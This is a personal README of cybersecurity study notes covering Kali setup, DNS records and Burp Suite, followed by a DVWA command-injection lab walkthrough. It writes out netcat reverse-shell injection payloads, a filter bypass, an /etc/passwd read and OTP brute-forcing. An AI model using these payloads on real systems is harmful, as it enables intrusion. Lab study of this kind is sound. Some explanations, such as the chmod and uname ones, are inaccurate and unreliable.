# Cyber-Security
## Installing Kali-Linux
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/4810e4b6-a12a-41d3-8212-268f5504bdc5)

### Updating Kali Linux
```
apt-get update && apt-get upgrade -y
```
### To know the username of the Kali Linux
```
uname -a
```
## File Architecture of Linux
### Root of Kali Linux
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/f35580b8-5751-483a-abb0-ba7558cb0e94)

### Login as a root user
```
sudo -i
```

### File Permissions
Groups in Linux
1. Admin/ Owner Group
2. User Group
3. Public Group

Modes:
R : Read    : 4
W : Write   : 2  
X : Execute : 1

Example: 6 - To give read and write permission to the admin
Example: 3 - To give write and execute permission to the user
Example: 7 - To give all the permission to the public

Command: ``` chmod 637 filename ```

To know the existing permission: ``` ls -l filename ```

### To create a new file:
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/12da759b-02d1-4185-bdab-c4a0005f04d5)

By default, the permission is 644.
Where a nono command is a text editor

## Burpsuite: To capture a request 
### Burpsuite proxy configuration
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/b305b725-69bf-46d7-9948-ce711c2a2bce)

### Start
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/d9972243-2a50-4f17-8c08-1315f435b68b)

All the requests will be intercepted in the burp suite tool.

![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/2b91c003-1049-4852-beeb-f2af41a06c26)

Intercepted request
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/c820e253-4010-49a1-92e4-2c2d2994bd8a)

### You can also install Proxy Switcher for Burpsuite
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/1185714f-8c93-488f-9ae5-859c86ef73a3)

### Difference between Burpsuite and Wireshark
The wireshark sends packets from one place to another, where we study packets. Using burpsuite, we analyze the requests made by your browser and the server. We don't see requests in the server.

### Linux Commands Cheetsheet
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/c22500a1-dcaa-483a-acc1-09ccb7f69479)

## Reconnaissance Methodology & Testing Environment
### Web Pentesting
To check for exploits for different operating systems: https://www.exploit-db.com/

## To use disposable email: getnada

## What are DNS records?
A DNS record is a domain name system that is a naming database where internet domain names are found and matched with their IP addresses. The domain name, along with its IP address, is referred to as the DNS record. </br>
Name Servers: These are responsible for storing DNS data to keep everything working smoothly.</br>
### Common DNS record types:
1. A (Address Record): A record is used to match a domain name to an IPV4 address to retrieve it.</br>
2. AAAA (Quad A): A type of DNS record that points to a domain or subdomain to an IPV6 address. So when someone types that domain or subdomain in the address bar, the browser knows where to go; here, IPV6 addresses are four times larger than IPV4 addresses and contain eight sets of numbers and letters.</br>
3. CNAME record: Points domains or subdomains to another domain.</br>
4. NS record (Name Servers): These are the servers where all the DNS records are stored. In order for a site to be live, we have to properly configure the name servers. Name servers are provided by the domain name registers or hosting providers.</br>
5. MX record (Mail Exchanger): These are used to point your domain to email servers using SMTP (Simple Mail Transfer Protocol). Like a CNAME record, an MX record should always point to another domain. When an email server needs to deliver an email to the recipient, it first needs to know where the recipient's mailbox is located. It does so by asking the DNS server for the server name of the server that has the mailbox.</br>
6. TXT Record (Text Record): These are used for various authentication methods. Used to verify the ownership of the domain and prevent spam by determining if the email is sent from a trusted source.</br>
7. PTR Record (Pointer To a Canonical Name): This is a security tool. They are used to track an IP address to its domain or reverse DNS lookup.</br>
8. SRV Record (generalized service location): Specifies the host and port for specific services such as voice over IP (VoIP). It serves as a starting and ending point for different network traffic.</br>
#### Reference: https://www.youtube.com/watch?v=VMKbwYMoxX4

### Cookie Editor and Cookie Extension
Cookie Editor 
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/49fbf37c-a134-4b68-a2da-ac056b4fca62)
Using Cookie Editor, we can export these cookies
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/b59aeddf-fb9d-4c91-b1b4-20745a7cbfef)
Example:
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/31c2600d-a2c4-4cc9-b607-ebc4f812322a)  </br>

## Burpsuite
### Proxy Module
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/6380f954-c378-44c8-9323-a2fe13791869)</br>
HTTP History in Proxy Module</br>
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/e146d18c-e279-4140-bd49-0e7706c694d5)</br>
Request and Response checking that we are getting from the server in HTTP History</br>
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/bbc44bf6-023f-42a0-a50a-4f6466fa0ab1)</br>
### Other Modules like Interceptor</br>
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/8451a752-9aae-4d87-b180-714d888dae76) </br>
Repeater: To see the live request and response. Used for testing purposes only.</br>
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/c3d5a96c-ef94-4728-a306-ce8336087fbc) </br>

### Intruder: Used to give an attack to the target
Intruder is just used for dictionary attacks. Or the attacks related to permutations and combinations. </br>
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/8395a87b-a2d0-4c47-b811-d0005c794953)</br>
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/18f4ccc3-3ed4-4c88-b2b0-9aa2bf31c066)</br>
Types of Attacks:</br>
1. Sniper attacks happen when you set the limit. For example, for four digits, it is 1000 - 9999 (Number of combinations available). Here, we can fix a target and attack in case OTP is a four-digit password.</br>
2. Clusterbombing doesn't have anything as a range in there. Here, we can use numbers and alphabets.  </br>

### Comparer compares the difference between data information.
### Decoder 
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/4cfa6386-9c4b-4759-bb6d-9b867799b3df)</br>
Example</br>
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/c3ab51b0-0803-4ae1-88ba-7427665a438d)</br>

# Web Pentesting

### Starting Apache Server
```
sudo service apache2 start
```
## Installing Apache2 Server
```
sudo apt-get install apache2
```

## Apache 2 Server Running
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/8a137c56-e819-4903-a44b-0a99ef7716e8)

### Setting Up DVWA
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/cbb7fce4-b1d8-4c4a-87a1-a25876b7a52b)
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/81755d5a-d77b-47bb-b722-2ad6f1db950b)
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/8b4a008e-c7f1-4b39-beab-55ab534f2469)
### Edit PHP version
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/1e7d627a-0880-4640-8ff6-d60965d2be7c)
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/71c3073e-98b4-4418-a5f5-ebaede707c21)

### Reloading Apache2 Server
```
sudo service apache2 reload
```

### DVWA installed
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/e832204c-cb22-43cd-8ed9-19aec02f00df)

## Command Injection using DVWA with Low Level Security
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/34b9008e-a81c-49b2-ac04-4f24ac69ed8e)
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/c2850104-fc23-4d87-8e69-d39e9bcb9357)
We can see that we are getting successful responses from the website.

## Checking where exactly we are in the command prompt
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/242aed98-9bbe-4bb6-b47f-c170b692c1f5)

## Making a connection inside the shell from WebApp
### How to start your netcat services?
- Go to terminal
```
nc -vv -l -p 8080
```
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/4c7be283-a663-4641-8a6c-d652cecc7f5b)

### Giving connection of the whole server to the terminal
To execute the netcat services -> 192.168.86.226; nc -e /bin/sh 192.168.86.226 8080 </br>
In Linux, netcat is always hosted in the bin folder. </br>
Here, we are making a connection from WebApp to the Operating System. A command in which we will use the IP of our OS to fire on the website by which we will get a connection in our terminal. </br>

![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/0b1f284b-a82f-4b87-a7a1-e6dbaba39ffe)
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/fc70f6a4-d6eb-4c7c-b58c-78b6d87d5f59)
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/3d7495bf-0460-4b7f-810f-cad3a109e632)

## Changing the DVWA Security to Medium
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/c07cee8b-17fb-4c6b-a6bd-50ef92d9a2a7)

You can start netcat services again.
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/5bb1b345-78b6-4196-ac15-c4b5dbfacd23)

Edit command injection source file in DVWA
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/23cb310d-017a-4ba5-bea1-584c3c12b28d)

Making connections over netcat services as well </br>
Command:
```
192.168.86.226 | nc -e /bin/sh 192.168.86.226 8080
```

![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/4cdd743f-6f9e-4862-a024-100457c575b6)
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/0f5ff2b3-d064-40f3-96f0-d926a46a7b62)

### Breaching the higher level of security
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/f4518d06-9a09-4f3a-b0bc-562cf0431c99)

### Command Injection Source File of DVWA for High Level of Security
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/e4cd8b9e-7c9a-49a9-9fa8-530b1fd7d06f)
## Blacklist
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/80c0a582-d984-43d1-b026-c0f5a17c55b3)

Command:
```
192.168.86.226|pwd
```

![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/ad900b33-00b0-480f-a942-2d17408a48e1)

Making connections over netcat services as well </br>
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/aab6c956-0cff-49c0-81ec-07b3eadc7013)
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/881e0076-4fca-45e7-be9a-ac9cbf147416)

Command:
```
192.168.86.226|nc -e /bin/sh 192.168.86.226 8080 -> Not Working
```

### Jumping on to the default password files: from etc folders
From this, we can find the system's default passwords.
```
192.168.86.226|cat /etc/passwd
```
![image](https://github.com/srsapireddy/Cyber-Security/assets/32967087/05e3cca3-760f-4070-a743-0be6e8479bb7)









































